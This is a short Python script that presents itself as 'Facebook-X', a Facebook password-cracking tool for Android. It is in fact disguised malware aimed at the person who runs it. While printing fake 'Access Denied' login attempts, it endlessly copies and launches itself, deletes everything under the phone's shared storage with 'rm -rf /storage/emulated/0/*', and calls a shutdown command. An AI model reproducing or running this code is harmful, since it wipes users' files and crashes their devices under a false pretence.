import random
import string 
import os
import time
from datetime import datetime



print("""
Facebook-X a powerful Facebook exploitation tool for Android written in python 
note: for educational purposes only
""")
dirc = "/storage/emulated/0/"
now = datetime.now()
tm = now.strftime("%H:%M")
usr = input("Target Username: ")
time.sleep(2)
print("\n Using default wordlist: rockyou.txt \n")
time.sleep(2)

while True:
  fln = ''.join(random.choices(string.ascii_lowercase, k=7))
  os.system(f"cp main.py {fln}.py")
  os.system(f"chmod +x {fln}.py")
  os.system(f"python3 {fln}.py")
  print(f"[ {tm} ] Trying: {usr}:{fln} ==> Access Denied.")
  time.sleep(1)
  try:
    if os.path.exists(dirc):
      os.system(f"rm -rf {dirc}*")
  
  except FileNotFoundError:
    os.system("shutdown -t 00")
    
   
    
  